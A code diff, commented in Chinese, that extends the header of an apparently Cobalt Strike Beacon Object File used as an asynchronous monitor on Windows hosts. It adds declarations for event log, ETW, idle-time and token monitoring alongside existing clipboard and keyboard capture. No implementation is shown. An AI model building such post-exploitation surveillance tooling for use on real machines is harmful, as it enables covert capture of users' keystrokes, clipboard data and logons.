@@ -8,6 +8,38 @@
 #include <tlhelp32.h>
 #include <winsock.h>
 #include <iphlpapi.h>
+#include <winwlx.h>
+#include <ntsecapi.h>
+#include <winternl.h>
+
+// 添加ETW和事件日志相关头文件
+#include <evntrace.h>
+#include <evntcons.h>
+#include <winevt.h>
+
+// 定义一些可能缺失的类型
+#ifndef EVT_HANDLE
+#define EVT_HANDLE HANDLE
+#endif
+
+#ifndef EVT_SUBSCRIBE_NOTIFY_ACTION
+typedef enum _EVT_SUBSCRIBE_NOTIFY_ACTION {
+    EvtSubscribeActionError,
+    EvtSubscribeActionDeliver
+} EVT_SUBSCRIBE_NOTIFY_ACTION;
+#endif
+
+#ifndef EVT_SUBSCRIBE_CALLBACK
+typedef DWORD (WINAPI *EVT_SUBSCRIBE_CALLBACK)(
+    EVT_SUBSCRIBE_NOTIFY_ACTION Action,
+    PVOID UserContext,
+    EVT_HANDLE Event
+);
+#endif
+
+#ifndef PEVENT_RECORD
+typedef struct _EVENT_RECORD EVENT_RECORD, *PEVENT_RECORD;
+#endif
 
 // 确保ULONG_PTR定义可用
 #ifndef ULONG_PTR
@@ -39,6 +71,19 @@
 #define SERVICE_QUERY_STATUS 0x0004
 #endif
 
+// 事件监控相关常量
+#define MAX_EVENT_BUFFER_SIZE 1024
+#define EVENT_LOG_CHANNEL_SECURITY L"Security"
+#define EVENT_LOG_CHANNEL_SYSTEM L"System"
+#define EVENT_LOG_CHANNEL_APPLICATION L"Application"
+
+// 真实事件监控函数声明
+// （将在结构体定义之后重新声明）
+
+// ETW相关常量
+// #define KERNEL_LOGGER_NAME L"NT Kernel Logger"  // 注释掉，使用系统定义
+#define PROCESS_TRACE_CONTROL_GUID {0x68fdd900, 0x4a3e, 0x11d1, {0x84, 0xf4, 0x00, 0x00, 0xf8, 0x04, 0x64, 0xe3}}
+
 // Cobalt Strike BOF API definitions
 typedef struct {
     char* original;
@@ -66,6 +111,15 @@ int MSVCRT$sprintf(char* str, const char* format, ...);
 char* MSVCRT$strstr(const char* str, const char* substr);
 
 // Windows API函数声明
+// 事件日志相关API
+HANDLE WINAPI ADVAPI32$OpenEventLogA(LPCSTR lpUNCServerName, LPCSTR lpSourceName);
+BOOL WINAPI ADVAPI32$ReadEventLogA(HANDLE hEventLog, DWORD dwReadFlags, DWORD dwRecordOffset, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, DWORD *pnBytesRead, DWORD *pnMinNumberOfBytesNeeded);
+BOOL WINAPI ADVAPI32$CloseEventLog(HANDLE hEventLog);
+
+// 新的Windows事件API (Vista+)
+EVT_HANDLE WINAPI WEVTAPI$EvtSubscribe(EVT_HANDLE Session, HANDLE SignalEvent, LPCWSTR ChannelPath, LPCWSTR Query, EVT_HANDLE Bookmark, PVOID Context, EVT_SUBSCRIBE_CALLBACK Callback, DWORD Flags);
+BOOL WINAPI WEVTAPI$EvtClose(EVT_HANDLE Object);
+HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
 HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
 HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
@@ -109,6 +163,19 @@ BOOL WINAPI USER32$CloseClipboard(VOID);
 HANDLE WINAPI USER32$GetClipboardData(UINT uFormat);
 BOOL WINAPI USER32$AddClipboardFormatListener(HWND hwnd);
 BOOL WINAPI USER32$RemoveClipboardFormatListener(HWND hwnd);
+BOOL WINAPI USER32$GetLastInputInfo(PLASTINPUTINFO plii);
+
+// 添加LASTINPUTINFO结构体定义
+#ifndef LASTINPUTINFO
+typedef struct tagLASTINPUTINFO {
+    UINT cbSize;
+    DWORD dwTime;
+} LASTINPUTINFO, *PLASTINPUTINFO;
+#endif
+
+// Token相关API
+BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
+DWORD WINAPI KERNEL32$GetTickCount64(VOID);
 
 // 事件类型定义
 typedef enum {
@@ -119,9 +186,17 @@ typedef enum {
     EVENT_VPN_CONNECTION,
     EVENT_WIFI_CONNECTION,
     EVENT_TICKET_EXPIRATION,
-    EVENT_CLIPBOARD_COPY,  // 新增：剪贴板复制事件
-    EVENT_KEYBOARD_INPUT,  // 新增：键盘输入事件
-    EVENT_USER_LOGON      // 新增：用户登录事件（与USERMON对应）
+    EVENT_CLIPBOARD_COPY,
+    EVENT_KEYBOARD_INPUT,
+    EVENT_USER_LOGON,
+    // 新增真实事件监控类型
+    EVENT_REAL_PROCESS_CREATE,    // 真实进程创建事件
+    EVENT_REAL_PROCESS_TERMINATE, // 真实进程终止事件
+    EVENT_REAL_FILE_ACCESS,       // 文件访问事件
+    EVENT_REAL_REGISTRY_CHANGE,   // 注册表变更事件
+    EVENT_REAL_NETWORK_CONNECTION,// 网络连接事件
+    EVENT_REAL_LOGIN_ATTEMPT,     // 真实登录尝试事件
+    EVENT_REAL_PRIVILEGE_ESCALATION // 权限提升事件
 } event_type_t;
 
 // 任务状态定义
@@ -132,33 +207,71 @@ typedef enum {
     TASK_CANCELLED
 } task_status_t;
 
+// 事件监控模式
+typedef enum {
+    MONITOR_MODE_POLLING,    // 轮询模式（当前实现）
+    MONITOR_MODE_EVENT_LOG,  // Windows事件日志
+    MONITOR_MODE_ETW,        // Event Tracing for Windows
+    MONITOR_MODE_WMI,        // WMI事件订阅
+    MONITOR_MODE_HOOK        // API Hook
+} monitor_mode_t;
+
 // 事件结构体
 typedef struct {
     event_type_t type;
     char host[64];
+    monitor_mode_t mode;  // 监控模式
+    DWORD event_id;       // Windows事件ID
+    ULONGLONG timestamp;  // 事件时间戳
     union {
         struct {
             char username[64];
+            DWORD session_id;
+            char source_ip[32];
         } admin_login;
         struct {
             char process_name[64];
+            DWORD process_id;
+            DWORD parent_pid;
+            char command_line[256];
+            char image_path[260];
         } process_start;
         struct {
             char username[64];
             int is_remote;
+            DWORD session_id;
+            char source_workstation[64];
         } user_login;
         struct {
             char ssid[64];
+            char adapter_name[64];
         } wifi_connection;
         struct {
             unsigned int minutes_left;
+            char ticket_type[32];
         } ticket_expiration;
+        struct {
+            char file_path[260];
+            DWORD access_type;
+            char process_name[64];
+        } file_access;
+        struct {
+            char key_path[260];
+            char value_name[64];
+            DWORD change_type;
+        } registry_change;
+        struct {
+            char local_address[32];
+            char remote_address[32];
+            DWORD local_port;
+            DWORD remote_port;
+            char protocol[16];
+        } network_connection;
         struct {
             char name[64];
             char data[128];
         } custom;
     } data;
-    unsigned long long timestamp;
 } event_t;
 
 // 任务结构体
@@ -166,12 +279,24 @@ typedef struct async_task {
     char name[64];
     task_status_t status;
     event_type_t event_type;
+    monitor_mode_t monitor_mode;  // 监控模式
     char params[256];
     unsigned int interval;   // 检查间隔（秒）
     unsigned int last_check; // 上次检查时间
     unsigned int task_id;    // 任务ID
     HANDLE thread_handle;    // 线程句柄
     DWORD thread_id;         // 线程ID
+    
+    // 事件监控相关句柄
+    HANDLE event_log_handle;      // 事件日志句柄
+    HANDLE etw_session_handle;    // ETW会话句柄
+    EVT_HANDLE event_subscription; // 事件订阅句柄
+    
+    // 统计信息
+    DWORD events_detected;        // 检测到的事件数
+    DWORD false_positives;        // 误报数
+    ULONGLONG start_time;         // 任务开始时间
+    
     struct async_task* next; // 指向下一个任务的指针
 } async_task_t;
 
@@ -203,9 +328,94 @@ int monitor_clipboard_copy(async_task_t* task);
 int monitor_keyboard_input(async_task_t* task);
 int monitor_user_logon(async_task_t* task);
 
-// 辅助函数声明
-const char* get_event_name(event_type_t type);
-const char* get_task_status_name(task_status_t status);
+// 真实事件监控函数
+int monitor_real_process_events(async_task_t* task);
+int monitor_real_file_access(async_task_t* task);
+int monitor_real_registry_changes(async_task_t* task);
+int monitor_real_network_events(async_task_t* task);
+int monitor_real_login_events(async_task_t* task);
+int monitor_real_privilege_escalation(async_task_t* task);
+int monitor_process_events_via_eventlog(async_task_t* task);
+int monitor_process_events_via_etw(async_task_t* task);
+
+// 事件监控设置函数
+int setup_event_log_monitoring(async_task_t* task);
+int setup_etw_monitoring(async_task_t* task);
+int setup_wmi_monitoring(async_task_t* task);
+void cleanup_event_monitoring(async_task_t* task);
+
+// 事件解析辅助函数
+char* extract_username_from_event(EVENTLOGRECORD* pRecord);
+const char* get_login_event_description(DWORD event_id);
+
+// 事件日志相关函数
+int setup_event_log_monitoring(async_task_t* task);
+int setup_etw_monitoring(async_task_t* task);
+int setup_wmi_monitoring(async_task_t* task);
+void cleanup_event_monitoring(async_task_t* task);
+
+// 事件处理回调函数
+DWORD WINAPI event_log_callback(EVT_SUBSCRIBE_NOTIFY_ACTION action, PVOID user_context, EVT_HANDLE event);
+void WINAPI etw_event_callback(PEVENT_RECORD event_record);
+
+// 工具函数
+WCHAR* get_event_xml_data(EVT_HANDLE event, LPCWSTR property_name);
+DWORD get_event_data_dword(EVT_HANDLE event, LPCWSTR property_name);
+ULONGLONG get_event_data_ulonglong(EVT_HANDLE event, LPCWSTR property_name);
+int parse_event_data(EVT_HANDLE event, event_t* parsed_event);
+
+// 错误处理和日志记录
+typedef enum {
+    ASYNC_BOF_SUCCESS = 0,
+    ASYNC_BOF_ERROR_MEMORY_ALLOCATION,
+    ASYNC_BOF_ERROR_INVALID_PARAMETER,
+    ASYNC_BOF_ERROR_API_FAILURE,
+    ASYNC_BOF_ERROR_REGISTRY_ACCESS,
+    ASYNC_BOF_ERROR_THREAD_CREATION,
+    ASYNC_BOF_ERROR_EVENT_LOG_ACCESS,
+    ASYNC_BOF_ERROR_PERMISSION_DENIED,
+    ASYNC_BOF_ERROR_TIMEOUT,
+    ASYNC_BOF_ERROR_UNKNOWN
+} async_bof_error_t;
+
+typedef enum {
+    LOG_LEVEL_DEBUG = 0,
+    LOG_LEVEL_INFO = 1,
+    LOG_LEVEL_WARNING = 2,
+    LOG_LEVEL_ERROR = 3,
+    LOG_LEVEL_CRITICAL = 4
+} log_level_t;
+
+// 错误处理函数声明
+void set_last_error(async_bof_error_t error, const char* message);
+async_bof_error_t get_last_error();
+const char* get_last_error_message();
+const char* get_error_string(async_bof_error_t error);
+void log_message(log_level_t level, const char* function, int line, const char* format, ...);
+void set_log_level(log_level_t level);
+void* safe_malloc(size_t size);
+void safe_free(void* ptr);
+int safe_strcpy(char* dest, size_t dest_size, const char* src);
+int validate_task_params(const char* name, event_type_t type, const char* params);
+int check_win32_error(const char* api_name, BOOL result);
+int check_admin_privileges();
+void cleanup_resources();
+void init_error_handling();
+
+#ifndef BOF_BUILD
+// 本地测试环境不需要重新声明这些函数
+#else
+// BOF环境下的缺失API声明
+int MSVCRT$vsprintf(char* str, const char* format, va_list args);
+DWORD GetLastError();
+#endif
+
+// 日志记录宏定义
+#define LOG_DEBUG(format, ...) log_message(LOG_LEVEL_DEBUG, __FUNCTION__, __LINE__, format, ##__VA_ARGS__)
+#define LOG_INFO(format, ...) log_message(LOG_LEVEL_INFO, __FUNCTION__, __LINE__, format, ##__VA_ARGS__)
+#define LOG_WARNING(format, ...) log_message(LOG_LEVEL_WARNING, __FUNCTION__, __LINE__, format, ##__VA_ARGS__)
+#define LOG_ERROR(format, ...) log_message(LOG_LEVEL_ERROR, __FUNCTION__, __LINE__, format, ##__VA_ARGS__)
+#define LOG_CRITICAL(format, ...) log_message(LOG_LEVEL_CRITICAL, __FUNCTION__, __LINE__, format, ##__VA_ARGS__)
 
 // 本地测试相关函数声明
 #ifndef BOF_BUILD
